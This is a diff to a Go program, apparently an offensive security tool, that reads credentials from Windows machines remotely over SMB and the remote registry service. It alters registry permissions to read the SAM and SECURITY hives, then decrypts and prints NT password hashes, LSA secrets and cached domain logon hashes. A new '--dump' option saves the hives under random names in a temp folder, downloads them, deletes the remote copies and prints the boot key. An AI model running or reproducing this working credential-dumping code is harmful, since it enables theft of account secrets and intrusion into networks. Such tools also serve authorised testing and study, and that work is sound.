@@ -25,7 +25,9 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"math/rand"
 	"os"
+	"strings"
 	"time"
 
 	rundebug "runtime/debug"
@@ -40,6 +42,20 @@ import (
 
 var log = golog.Get("")
 var release string = "0.1.3"
+
+var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+func getRandString(n int) string {
+	arr := make([]rune, n)
+	for i := range arr {
+		arr[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(arr)
+}
 
 func startRemoteRegistry(session *smb.Connection, share string) (err error) {
 	f, err := session.OpenFile(share, "svcctl")
@@ -187,6 +203,289 @@ func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string, m map[
 	return nil
 }
 
+func downloadAndDeleteFile(session *smb.Connection, localFilename, remotePath string) (err error) {
+	// Convert to valid remote path
+	parts := strings.Split(remotePath, ":\\")
+	if len(parts) > 1 {
+		remotePath = parts[1]
+	}
+
+	f, err := os.OpenFile(localFilename, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+	defer f.Close()
+
+	// Call library function to retrieve the file
+	log.Infof("Trying to download remote file C:\\%s\n", remotePath)
+	err = session.RetrieveFile("C$", remotePath, 0, f.Write)
+	if err != nil {
+		log.Errorf("Failed to retrieve remote file C:\\%s with error: %s\n", remotePath, err)
+	} else {
+		log.Infof("Successfully downloaded %s\n", remotePath)
+	}
+
+	// Remove the remote files
+	log.Infof("Trying to delete remote file C:\\%s\n", remotePath)
+	err = session.DeleteFile("C$", remotePath)
+	if err != nil {
+		log.Errorf("Failed to delete remote file C:\\%s with error: %s\n", remotePath, err)
+		return
+	} else {
+		log.Infof("Successfully deleted remote file C:\\%s\n", remotePath)
+	}
+
+	return
+}
+
+func dumpOffline(session *smb.Connection, rpccon *msrrp.RPCCon, hKey []byte, dst string) (err error) {
+
+	log.Infoln("Attempting to dump SAM and SECURITY hives to disk and then retrieve the files for local parsing using some other tool")
+	windowsPath := strings.ReplaceAll(dst, "/", "\\")
+	// Ensure the path ends with a backslash
+	if !strings.HasSuffix(windowsPath, "\\") {
+		windowsPath += "\\"
+	}
+	samPath := windowsPath + getRandString(7) + ".log"
+	securityPath := windowsPath + getRandString(7) + ".log"
+
+	// Dump SAM
+	// Open a key handle
+	hSubKey, err := rpccon.OpenSubKey(hKey, "SAM")
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+	err = rpccon.RegSaveKey(hSubKey, samPath, "")
+	if err != nil {
+		log.Errorln(err)
+		rpccon.CloseKeyHandle(hSubKey)
+		return
+	}
+	rpccon.CloseKeyHandle(hSubKey)
+	log.Infof("Dumped SAM hive to %s\n", samPath)
+
+	// Retrieve the file
+	err = downloadAndDeleteFile(session, "sam.dmp", samPath)
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+
+	// Dump SECURITY
+	// Open a key handle
+	hSubKey, err = rpccon.OpenSubKey(hKey, "SECURITY")
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+	err = rpccon.RegSaveKey(hSubKey, securityPath, "")
+	if err != nil {
+		log.Errorln(err)
+		rpccon.CloseKeyHandle(hSubKey)
+		return
+	}
+	rpccon.CloseKeyHandle(hSubKey)
+	log.Infof("Dumped SECURITY hive to %s\n", securityPath)
+
+	// Retrieve the file
+	err = downloadAndDeleteFile(session, "security.dmp", securityPath)
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+
+	// Dump the bootkey
+	bootkey, err := getBootKey(rpccon, hKey)
+	if err != nil {
+		log.Errorf("Failed to extract the Bootkey from the SYSTEM hive with error: %s\n", err)
+		return
+	}
+
+	fmt.Println("Downloaded SAM and SECURITY hives to local files sam.dmp and security.dmp")
+	fmt.Printf("Bootkey for decrypting SAM and SECURITY hives: %x\n", bootkey)
+
+	return nil
+}
+
+func dumpOnline(rpccon *msrrp.RPCCon, hKey []byte) error {
+	log.Noticeln("Performing an online dump of secrets from the registry")
+	// Most of the registry keys needed for extracting secrets from the registry.
+	// The local group "administrators" has WriteDACL on HKLM:\\SAM\SAM so that
+	// SID is used for the temporary increase in privileges.
+	// Note that this list is extended with dynamically discovered SIDs for
+	// local users.
+	sid := "S-1-5-32-544"
+	keys := []string{
+		`SAM\SAM`,
+		`SAM\SAM\Domains`,
+		`SAM\SAM\Domains\Account`,
+		`SAM\SAM\Domains\Account\Users`,
+		`SECURITY\Policy\Secrets`,
+		`SECURITY\Policy\Secrets\NL$KM`,
+		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
+		`SECURITY\Cache`,
+		`SECURITY\Policy\PolEKList`,
+		`SECURITY\Policy\PolSecretEncryptionKey`,
+	}
+
+	// Grant temporarily higher permissions to the local administrators group
+	m, err := changeDacl(rpccon, hKey, keys, sid, nil)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	// Get RIDs of local users
+	keyUsers := `SAM\SAM\Domains\Account\Users`
+	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+	}
+
+	rids = rids[:len(rids)-1]
+	for i := range rids {
+		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
+	}
+
+	// Extend the list of keys that have temporarily altered permissions
+	keys = append(keys, rids...)
+	// Grant temporarily higher permissions to the local administrators group
+	m, err = changeDacl(rpccon, hKey, rids, sid, m)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+
+	syskey, err := getSysKey(rpccon, hKey)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+
+	// Gather credentials/secrets
+	creds, err := getNTHash(rpccon, hKey, rids)
+	if err != nil {
+		log.Errorln(err)
+		// Try to get other secrets instead of hard fail
+	} else {
+		for _, cred := range creds {
+			fmt.Printf("Name: %s\n", cred.Username)
+			fmt.Printf("RID: %d\n", cred.RID)
+			if len(cred.Data) == 0 {
+				fmt.Printf("NT: <empty>\n\n")
+				continue
+			}
+			var hash []byte
+			if cred.AES {
+				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
+			} else {
+				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
+			}
+			fmt.Printf("NT: %x\n\n", hash)
+		}
+	}
+
+	// Get names of lsa secrets
+	keySecrets := `SECURITY\Policy\Secrets`
+	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+	newSecrets := make([]string, 0, len(secrets)*2)
+	for i := range secrets {
+		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
+		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
+	}
+
+	keys = append(keys, newSecrets...)
+	m, err = changeDacl(rpccon, hKey, newSecrets, sid, m)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+
+	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
+	if err != nil {
+		log.Noticeln("Failed to get lsa secrets")
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+	if len(lsaSecrets) > 0 {
+		fmt.Println("[*] LSA Secrets:")
+		for _, secret := range lsaSecrets {
+			fmt.Println(secret.secretType)
+			for _, item := range secret.secrets {
+				fmt.Println(item)
+			}
+			if secret.extraSecret != "" {
+				fmt.Println(secret.extraSecret)
+			}
+		}
+	}
+
+	cachedHashes, err := GetCachedHashes(rpccon, hKey)
+	if err != nil {
+		log.Errorln(err)
+		err = tryRollbackChanges(rpccon, hKey, keys, m)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+		return err
+	}
+
+	if len(cachedHashes) > 0 {
+		fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
+		for _, secret := range cachedHashes {
+			fmt.Println(secret)
+		}
+	}
+
+	//Revert changes
+	err = tryRollbackChanges(rpccon, hKey, keys, m)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	fmt.Println("Restored permissions on ACLs")
+
+	return nil
+}
+
 var helpMsg = `
     Usage: ` + os.Args[0] + ` [options]
 
@@ -198,17 +497,20 @@ var helpMsg = `
       -p, --pass                Password
           --hash                Hex encoded NT Hash for user password
           --local               Authenticate as a local user instead of domain user
+          --dump                Saves the SAM and SECURITY hives to disk and
+                                transfers them to the local machine.
       -t, --timeout             Dial timeout in seconds (default 5)
           --noenc               Disable smb encryption
           --smb2                Force smb 2.1
           --debug               Enable debug logging
+          --verbose             Enable verbose logging
       -v, --version             Show version
 `
 
 func main() {
 	var host, username, password, hash, domain string
 	var port, dialTimeout int
-	var debug, noEnc, forceSMB2, localUser, version bool
+	var debug, noEnc, forceSMB2, localUser, dump, version, verbose bool
 	var err error
 
 	flag.Usage = func() {
@@ -216,24 +518,26 @@ func main() {
 		os.Exit(0)
 	}
 
-	flag.StringVar(&host, "host", "", "host")
-	flag.StringVar(&username, "u", "", "username")
-	flag.StringVar(&username, "user", "", "username")
-	flag.StringVar(&password, "p", "", "password")
-	flag.StringVar(&password, "pass", "", "password")
-	flag.StringVar(&hash, "hash", "", "hex encoded NT Hash for user")
-	flag.StringVar(&domain, "d", "", "domain")
-	flag.StringVar(&domain, "domain", "", "domain")
-	flag.IntVar(&port, "P", 445, "SMB Port")
-	flag.IntVar(&port, "port", 445, "SMB Port")
-	flag.BoolVar(&debug, "debug", false, "enable debugging")
-	flag.BoolVar(&noEnc, "noenc", false, "disable smb encryption")
-	flag.BoolVar(&forceSMB2, "smb2", false, "Force smb 2.1")
-	flag.BoolVar(&localUser, "local", false, "Authenticate as a local user instead of domain user")
-	flag.IntVar(&dialTimeout, "t", 5, "Dial timeout in seconds")
-	flag.IntVar(&dialTimeout, "timeout", 5, "Dial timeout in seconds")
-	flag.BoolVar(&version, "v", false, "Show version")
-	flag.BoolVar(&version, "version", false, "Show version")
+	flag.StringVar(&host, "host", "", "")
+	flag.StringVar(&username, "u", "", "")
+	flag.StringVar(&username, "user", "", "")
+	flag.StringVar(&password, "p", "", "")
+	flag.StringVar(&password, "pass", "", "")
+	flag.StringVar(&hash, "hash", "", "")
+	flag.StringVar(&domain, "d", "", "")
+	flag.StringVar(&domain, "domain", "", "")
+	flag.IntVar(&port, "P", 445, "")
+	flag.IntVar(&port, "port", 445, "")
+	flag.BoolVar(&debug, "debug", false, "")
+	flag.BoolVar(&verbose, "verbose", false, "")
+	flag.BoolVar(&noEnc, "noenc", false, "")
+	flag.BoolVar(&forceSMB2, "smb2", false, "")
+	flag.BoolVar(&localUser, "local", false, "")
+	flag.BoolVar(&dump, "dump", false, "")
+	flag.IntVar(&dialTimeout, "t", 5, "")
+	flag.IntVar(&dialTimeout, "timeout", 5, "")
+	flag.BoolVar(&version, "v", false, "")
+	flag.BoolVar(&version, "version", false, "")
 
 	flag.Parse()
 
@@ -244,6 +548,12 @@ func main() {
 		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
 		log.SetLogLevel(golog.LevelDebug)
+	} else if verbose {
+		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		log.SetLogLevel(golog.LevelInfo)
 	} else {
 		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
@@ -378,175 +688,13 @@ func main() {
 	}
 	defer rpccon.CloseKeyHandle(hKey)
 
-	// Most of the registry keys needed for extracting secrets from the registry.
-	// The local group "administrators" has WriteDACL on HKLM:\\SAM\SAM so that
-	// SID is used for the temporary increase in privileges.
-	// Note that this list is extended with dynamically discovered SIDs for
-	// local users.
-	sid := "S-1-5-32-544"
-	keys := []string{
-		`SAM\SAM`,
-		`SAM\SAM\Domains`,
-		`SAM\SAM\Domains\Account`,
-		`SAM\SAM\Domains\Account\Users`,
-		`SECURITY\Policy\Secrets`,
-		`SECURITY\Policy\Secrets\NL$KM`,
-		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
-		`SECURITY\Cache`,
-		`SECURITY\Policy\PolEKList`,
-		`SECURITY\Policy\PolSecretEncryptionKey`,
-	}
-
-	// Grant temporarily higher permissions to the local administrators group
-	m, err := changeDacl(rpccon, hKey, keys, sid, nil)
-	if err != nil {
-		log.Errorln(err)
-		return
-	}
-
-	// Get RIDs of local users
-	keyUsers := `SAM\SAM\Domains\Account\Users`
-	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-	}
-
-	rids = rids[:len(rids)-1]
-	for i := range rids {
-		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
-	}
-
-	// Extend the list of keys that have temporarily altered permissions
-	keys = append(keys, rids...)
-	// Grant temporarily higher permissions to the local administrators group
-	m, err = changeDacl(rpccon, hKey, rids, sid, m)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-
-	syskey, err := getSysKey(rpccon, hKey)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-
-	// Gather credentials/secrets
-	creds, err := getNTHash(rpccon, hKey, rids)
-	if err != nil {
-		log.Errorln(err)
-		// Try to get other secrets instead of hard fail
+	if dump {
+		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
 	} else {
-		for _, cred := range creds {
-			fmt.Printf("Name: %s\n", cred.Username)
-			fmt.Printf("RID: %d\n", cred.RID)
-			if len(cred.Data) == 0 {
-				fmt.Printf("NT: <empty>\n\n")
-				continue
-			}
-			var hash []byte
-			if cred.AES {
-				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
-			} else {
-				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
-			}
-			fmt.Printf("NT: %x\n\n", hash)
-		}
+		err = dumpOnline(rpccon, hKey)
 	}
-
-	// Get names of lsa secrets
-	keySecrets := `SECURITY\Policy\Secrets`
-	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
 	if err != nil {
 		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-	newSecrets := make([]string, 0, len(secrets)*2)
-	for i := range secrets {
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
 	}
 
-	keys = append(keys, newSecrets...)
-	m, err = changeDacl(rpccon, hKey, newSecrets, sid, m)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-
-	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
-	if err != nil {
-		log.Noticeln("Failed to get lsa secrets")
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-	if len(lsaSecrets) > 0 {
-		fmt.Println("[*] LSA Secrets:")
-		for _, secret := range lsaSecrets {
-			fmt.Println(secret.secretType)
-			for _, item := range secret.secrets {
-				fmt.Println(item)
-			}
-			if secret.extraSecret != "" {
-				fmt.Println(secret.extraSecret)
-			}
-		}
-	}
-
-	cachedHashes, err := GetCachedHashes(rpccon, hKey)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return
-		}
-		return
-	}
-
-	if len(cachedHashes) > 0 {
-		fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
-		for _, secret := range cachedHashes {
-			fmt.Println(secret)
-		}
-	}
-
-	//Revert changes
-	err = tryRollbackChanges(rpccon, hKey, keys, m)
-	if err != nil {
-		log.Errorln(err)
-		return
-	}
-
-	fmt.Println("Done")
 }
